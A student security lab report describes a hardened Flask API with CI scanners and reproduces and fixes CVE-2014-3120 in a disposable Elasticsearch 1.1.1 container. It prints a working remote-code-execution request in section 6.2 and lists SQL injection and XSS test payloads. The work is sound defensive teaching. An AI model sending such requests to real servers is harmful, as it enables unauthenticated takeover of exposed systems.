# Laboratory Work No. 1

## Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis

| | |
| --- | --- |
| **Variant No.** | `________` |
| **Student (Surname, Name)** | `____________________` |
| **HDU number (student ID)** | `____________________` |
| **Group** | `________` |
| **Date** | `____ / ____ / 2026` |
| **Repository** | `https://github.com/mahaotian23320311/work1-secure-api` |
| **Last successful pipeline** | `https://github.com/mahaotian23320311/work1-secure-api/actions/runs/<id>` |

---

## 1. Purpose of the work

The goal of the work is to walk the full security lifecycle of a small backend
service: design it against the OWASP Top 10, automate the security checks in
CI/CD, then take a real, publicly documented vulnerability, reproduce it in an
isolated environment, explain its root cause, fix it and prove that the fix
works without breaking the application.

Two deliverables are produced: a working, hardened REST API with a green
pipeline, and a reproducible analysis of **CVE-2014-3120** in Elasticsearch
1.1.1 using the Vulhub environment.

---

## 2. Project and API

### 2.1 Stack

| Layer | Choice | Why |
| --- | --- | --- |
| Language / framework | Python 3.11 + Flask 3 | small, explicit, easy to show the security controls in code |
| Storage | SQLite via `sqlite3` with parameterised statements | no ORM magic hides the SQL, so the anti-injection measure is visible |
| Authentication | PyJWT (HS256) + bcrypt | industry-standard token and password primitives |
| Tests | pytest (25 tests) | every security property is pinned by a test |
| CI | GitHub Actions | required by the assignment |
| CVE lab | Docker Compose + Vulhub | isolated, disposable vulnerable environment |

### 2.2 Endpoints

| Method | Path | Auth | Purpose |
| --- | --- | --- | --- |
| POST | `/auth/login` | no | validate credentials, return a JWT |
| GET | `/api/data` | Bearer JWT | list the post feed, optional `?search=` |
| POST | `/api/notes` | Bearer JWT | **self-chosen endpoint**: create a note owned by the caller |
| GET | `/api/notes/<id>` | Bearer JWT | read one note (owner or admin only) |
| GET | `/api/me` | Bearer JWT | current user profile |
| GET | `/health` | no | liveness probe |

Example session:

```
$ curl -s -i http://127.0.0.1:5001/api/data
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Bearer realm="api"
{"error":{"code":"missing_token","message":"A Bearer token is required."}}

$ curl -s -X POST http://127.0.0.1:5001/auth/login -d '{"username":"alice","password":"Alice-Passw0rd!"}'
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"Bearer","expires_in":1800}

$ curl -s -H 'Authorization: Bearer <token>' http://127.0.0.1:5001/api/data
{"count":3,"items":[{"id":1,"title":"Welcome to the secure notes API","author":"alice", ...}]}
```

The full 9-step curl transcript is stored in `reports/curl-transcript.txt`.

`[[SCREENSHOT: terminal running scripts/live_demo.ps1 – steps 1, 3, 4 visible]]`

---

## 3. Implemented security measures

### 3.1 Protection against SQL injection (A03)

All database access goes through parameterised statements. The query text and
the values are sent separately, so a value can never be parsed as SQL syntax.

```python
user = db.execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),
).fetchone()
```

Supporting details:

* no f-strings, `%` formatting or `.format()` near SQL anywhere in the code base;
* the `?search=` term is bound *and* its `%`/`_` wildcards are escaped
  (`LIKE ? ESCAPE '\'`), so `?search=%` does not dump the whole table;
* table and column names are hard-coded, never taken from input.

Verification — the payloads below are stored as data, not executed:

```
$ curl -s -H "Authorization: Bearer $T" "http://127.0.0.1:5001/api/data?search=%27%20OR%201%3D1--"
{"count":0,"items":[]}
```

`tests/test_security.py` replays `' OR '1'='1`, `alice' --`,
`' UNION SELECT id, username, password_hash … --` and `'; DROP TABLE users; --`
against both the login and the search endpoint: all are refused or return zero
rows, and the table still exists afterwards.

### 3.2 Protection against XSS (A03)

The API answers with JSON, which is *not* automatically XSS-safe — clients put
the JSON into the DOM. Therefore every string is HTML-escaped on the way out
(`escape_deep` in `app/security.py`), and the response carries hardening
headers:

```
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
```

Verification:

```
$ curl -s -X POST .../api/notes -d '{"title":"<script>alert(1)</script>","body":"<img src=x onerror=alert(2)>"}'
{"id":4,"title":"&lt;script&gt;alert(1)&lt;/script&gt;","body":"&lt;img src=x onerror=alert(2)&gt;", ...}
```

The stored markup comes back inert: no `<script>`, no `<img onerror>` reaches the
client as markup.

### 3.3 Broken authentication (A07)

* **Password storage** — bcrypt with a per-password random salt and cost factor
  12. Two users with the same password get different hashes; a stolen database
  cannot be turned into passwords cheaply. SHA-256 would be useless here: it is
  fast by design, so a GPU tests billions of candidates per second.
* **Token issuance** — HS256 JWT with `sub`, `username`, `role`, `iss`, `iat`,
  `nbf`, `exp` (30 min) and a random `jti`. The signing secret comes from the
  environment (`JWT_SECRET`); if it is absent, a random one is generated at
  start-up, so no default secret can ever ship.
* **Token verification** — `token_required` checks the header shape, decodes
  with `algorithms=["HS256"]` only (which rejects `alg: none` and
  algorithm-confusion forgeries), requires `exp`/`iat`/`sub`/`iss`, and then
  **re-reads the user from the database**, so a deleted or downgraded account
  cannot keep using an old token.
* **No user enumeration** — an unknown username still costs one bcrypt
  comparison (against a dummy hash) and returns exactly the same `401` body as a
  wrong password.

Verification: `tests/test_api.py` contains dedicated tests for a garbage token,
an expired token, an `alg: none` token, and a token signed with a different key
— all four are rejected with `401`.

---

## 4. CI/CD pipeline with security scanners

`.github/workflows/ci.yml` runs on every push and every pull request:

| Job | Tool | Gate |
| --- | --- | --- |
| `test` | pytest | any failing test fails the run |
| `sast` | bandit `-ll` | any medium/high finding fails the run |
| `sca` | pip-audit | any known-vulnerable dependency fails the run |

Reports are uploaded as build artifacts (`bandit-report`, `pip-audit-report`,
`pytest-report`), which is what the assignment asks to screenshot.

Local run of the same three commands:

```
$ pytest -q
25 passed

$ bandit -r app -x tests -ll
No issues identified.
Code scanned: 503 lines of code

$ pip-audit -r requirements.txt
No known vulnerabilities found
```

`[[SCREENSHOT: GitHub Actions – all three jobs green]]`

`[[SCREENSHOT: sast job log – "No issues identified"]]`

`[[SCREENSHOT: sca job log – "No known vulnerabilities found"]]`

---

## 5. Selected vulnerability

| | |
| --- | --- |
| **CVE** | CVE-2014-3120 |
| **Product** | Elasticsearch before 1.2.0 |
| **Class** | CWE-284 – improper access control (client-supplied code evaluation) |
| **CVSS 3.1** | 8.1 HIGH (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`; CVSS v2: 6.8) |
| **Published** | 28 July 2014 |
| **Fixed in** | 1.2.0 (dynamic scripting off by default); sandbox added in 1.4 |
| **Known exploited** | Yes — CISA KEV, added 2022-03-25 |
| **Source** | NVD, Elastic security page, Vulhub `elasticsearch/CVE-2014-3120` |

Elasticsearch exposes a scripting subsystem: a search request may carry a
script, and the node compiles and evaluates it inside its own JVM. Before 1.2
the default configuration allowed this for **every** request, with no sandbox
and no authentication, so one unauthenticated `POST /_search` containing
`java.lang.Runtime.getRuntime().exec(...)` runs a command as the user that
started the node — root, in the official image.

The Vulhub environment for this CVE is exactly that default: a single
`vulhub/elasticsearch:1.1.1` container on port 9200.

---

## 6. Reproduction

Environment: Docker Compose + Vulhub recipe (`vulnerability/vulnerable/`).

```bash
$ cd vulnerability/vulnerable
$ docker compose up -d
$ curl -s http://127.0.0.1:9200/
"number" : "1.1.1"
```

### 6.1 Index one document

```bash
$ curl -s -XPUT 'http://127.0.0.1:9200/blog/post/1' \
      -H 'Content-Type: application/json' -d '{"title":"hello"}'
{"_index":"blog","_type":"post","_id":"1","_version":1,"created":true}

$ curl -s -XPOST 'http://127.0.0.1:9200/blog/_refresh'
```

### 6.2 Make the search API execute Java

```bash
$ curl -s -XPOST 'http://127.0.0.1:9200/_search' -H 'Content-Type: application/json' -d '{
    "size":1,"query":{"match_all":{}},
    "script_fields":{"pwn":{"script":"java.lang.Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id > /tmp/pwned.txt\"})"}}
  }'
```

The response is an ordinary hit list, but the computed field is a process:

```json
{"hits":{"total":1,"hits":[{"_index":"blog","_type":"post","_id":"1",
  "fields":{"pwn":["java.lang.UNIXProcess@4de0408b"]}}]}}
```

### 6.3 Prove the command ran

```bash
$ docker compose exec -T es cat /tmp/pwned.txt
uid=0(root) gid=0(root) groups=0(root)
```

Both requests were executed against the running container on this machine; the
exact responses are in `reports/cve-2014-3120-all.log`.

`[[SCREENSHOT: terminal – curl _search returning UNIXProcess + `uid=0(root)` inside the container]]`

---

## 7. Root cause analysis

Elasticsearch's scripting feature lets a query compute values on the server.
The design intent was convenience ("score boost", "script fields"); the
security model was that the node is trusted and the client is not — except
nothing enforced that.

1. **Dangerous default.** `script.disable_dynamic` defaulted to `false` before
   1.2, so any script in a request body was compiled and executed. The only
   barrier between an attacker and `Runtime.getRuntime()` was the JSON parser.
2. **No sandbox.** In 1.0/1.1 the MVEL expression is evaluated with full Java
   reflection available. A scripting engine without a class filter is `eval()`
   for Java; the language choice (MVEL, then Groovy) changes nothing.
3. **No authentication.** Elasticsearch 1.x has no users, roles or TLS, and the
   image binds `0.0.0.0`. The CVSS vector lists `PR:L` because the vendor treats
   the API as privileged; on the network there is no credential at all, which is
   why the effective attack is pre-auth RCE.
4. **Blast radius.** The node runs as root in this image, so the first command
   already has full control: read the data directory, reach the network, or
   exhaust the heap.

The defect is therefore an access-control failure around a dangerous capability
(CWE-284): code evaluation was treated as an ordinary data field. Every later
fix is a way of taking that capability away from the client.

`[[SCREENSHOT: elasticsearch.yml showing script.disable_dynamic absent / default]]`

---

## 8. Applied fix

Three layers, weakest to strongest (`vulnerability/hardened/`,
`vulnerability/fixed/`):

1. **Configuration (mitigation)** — `script.disable_dynamic: true` on the same
   1.1.1 image. The node refuses to compile scripts arriving in a request; the
   search fails with `ScriptException[dynamic scripting disabled]`.
2. **Patch (upgrade)** — Elasticsearch 1.4.4. Dynamic scripting has been off by
   default since 1.2, and 1.4 adds a Groovy sandbox that filters classes.
3. **Design** — do not expose the scripting API to clients at all: network ACL,
   a reverse proxy that rejects `script`/`source` in requests, or Elasticsearch
   ≥ 2.0, where dynamic scripting was removed.

```dockerfile
# hardened/
FROM vulhub/elasticsearch:1.1.1
RUN echo "script.disable_dynamic: true" >> /usr/share/elasticsearch/config/elasticsearch.yml

# fixed/
FROM vulhub/elasticsearch:1.4.4
```

Why this is effective: layer 1 removes the primitive ("compile what the client
sent"), layer 2 removes it by default and adds a sandbox, layer 3 removes it from
the reachable surface. A nuance worth stating in the report: **1.4.4 is not the
end of the story** — in 2015 the 1.4.x sandbox was bypassed again
(CVE-2015-1427, Groovy sandbox escape) and 1.4.4 is still in that affected
range. That is precisely why the design layer is the durable one: "no
client-supplied scripts" survives the next clever expression, while a sandbox
has to be perfect every time.

---

## 9. Proof that the vulnerability is eliminated

Same three requests, rebuilt environments:

```
$ cd vulnerability/fixed && docker compose up --build -d
$ curl -s -XPOST 'http://127.0.0.1:9200/_search' -d '{... script_fields ...}'
HTTP/1.1 400   ScriptException[dynamic scripting for [groovy] disabled]

$ docker compose exec -T es cat /tmp/pwned.txt
cat: /tmp/pwned.txt: No such file or directory     # nothing executed

$ curl -s 'http://127.0.0.1:9200/blog/post/_search?q=hello'
{"hits":{"total":1, ...}}                          # service still works
```

### 9.1 The three scenarios, measured

To separate *mitigation* from *patch*, the vulnerable 1.1.1 image was also run
with `script.disable_dynamic: true`, i.e. the code is still 1.1.1 but the
capability is switched off.

| Scenario (`version.number`) | Attack response | `/tmp/pwned.txt` | Normal search |
| --- | --- | --- | --- |
| `vulnerable/` — 1.1.1, scripting on | **200**, `pwn: ["java.lang.UNIXProcess@…"]` | **`uid=0(root)`** | 1 hit |
| `hardened/` — 1.1.1 + `script.disable_dynamic` | **400**, `dynamic scripting disabled` | absent | 1 hit |
| `fixed/` — 1.4.4 | **400**, `dynamic scripting for [groovy] disabled` | absent | 1 hit |

Reading the table:

* row 1 is the vulnerability — the command really ran, as root;
* row 2 is the mitigation alone — same vulnerable code, attack refused, so the
  fix does not depend on the upgrade being possible;
* row 3 is the patched release — the request dies before any script is
  compiled, and the error names the new default engine (Groovy), which shows
  the server still understands the request but no longer evaluates it.

Automated verdict (`vulnerability/run_demo.ps1 -Phase all`):

```
PHASE 1: Elasticsearch 1.1.1 (dynamic scripting enabled)
VERDICT: code execution = SUCCESS (vulnerable, as expected)
VERDICT: normal search = OK
Result: PASS - vulnerability reproduced

PHASE 2: Elasticsearch 1.1.1 + script.disable_dynamic
VERDICT: script rejected = True
VERDICT: command executed = False
VERDICT: normal functionality intact = True
Result: PASS - vulnerability eliminated

PHASE 3: Elasticsearch 1.4.4 (dynamic scripting off by default)
VERDICT: script rejected = True
VERDICT: command executed = False
VERDICT: normal functionality intact = True
Result: PASS - vulnerability eliminated
```

Raw transcript: `reports/cve-2014-3120-all.log`.

`[[SCREENSHOT: fixed environment – attack returns 400, no file created, search still returns 1 hit]]`

`[[SCREENSHOT: hardened 1.1.1 – same 400 rejection, site still functional]]`

---

## 10. Conclusion

The work produced (a) a working API whose security properties are enforced in
code *and* pinned by tests, (b) a CI pipeline that fails on a medium SAST finding
or a vulnerable dependency, and (c) a reproducible exploitation-and-fix cycle for
a real CVE.

The most transferable lesson is from part (c): the flaw was not a missing `if`.
Elasticsearch 1.1.1 had a check — the request had to be well-formed JSON — but it
treated *code* as ordinary data, so the check was irrelevant. A capability that
lets a client run code is not something a filter can make safe; it has to be
removed from the reachable surface, or at minimum switched off by default. The
same reasoning explains why the upgrade alone is not the whole answer: 1.4.4
fixed this CVE and still fell to a sandbox escape a year later
(CVE-2015-1427), while "no client-supplied scripts" would have prevented both.

---

## Appendix A. Control questions (short answers)

1. **bcrypt vs SHA-256 for passwords.** SHA-256 is designed to be fast, so a GPU
   can try billions of candidates per second. bcrypt is deliberately slow and
   tunable (cost 12 ≈ 2^12 rounds), and it stores a per-password salt inside the
   hash, so identical passwords produce different hashes and precomputed
   rainbow tables do not apply.
2. **SAST vs DAST.** SAST analyses source code without running it — it sees
   every branch, including unreachable code, but produces false positives and
   cannot see configuration or runtime state. DAST attacks a running
   application from outside — it finds real, reachable issues but only covers
   what it can reach and gives less precise localisation.
3. **JWT mechanism.** A JWT is `base64url(header).base64url(payload).signature`.
   The payload carries claims (`sub`, `role`, `exp`, `iss`, `jti`). The server
   verifies the signature with a shared secret (HS256) or public key (RS256) and
   checks the time-based and issuer claims. The payload is signed, not
   encrypted — anyone can read it, so no secrets belong in it.
4. **Risk of not auditing dependencies.** Third-party code runs with your
   privileges. An unpatched library with a known CVE (Log4Shell, the
   event-stream incident) gives an attacker code execution or data access
   without ever touching your own source. SCA is the only control that catches
   this, because SAST looks at *your* code.
5. **Docker/Vulhub vs installing vulnerable software.** Containers are
   disposable, isolated and reproducible: no host pollution, no leftover
   services, a rollback is `docker compose down`, and the exact vulnerable
   version is pinned in a file that can be shared with the whole class.
6. **Vulnerability vs exploit.** A vulnerability is the flaw itself
   (Elasticsearch compiles and evaluates client-supplied scripts with full Java
   reflection and no authentication). An exploit is the concrete request that
   abuses it (`POST /_search` with `script_fields` calling
   `Runtime.getRuntime().exec`). In this work the vulnerability is the dangerous
   default in the product; the exploit is the curl request.
7. **Why regression testing after a patch.** A patch changes behaviour, and a
   security fix that disables the feature is not a fix. Here, a perfectly
   "secure" answer would be to block the whole service; the regression check
   (`GET /` still returns 200) proves the legitimate path still works.
8. **Why reproduce CVEs as a specialist.** A pentester needs to know what a
   working exploit looks like in order to judge whether a target is really
   affected, and a SOC analyst needs the same knowledge to recognise the
   traffic in logs. Reproduction turns a CVE description into a concrete
   signature: the `.%2e` pattern in a URL is trivial to grep for once you have
   seen it.
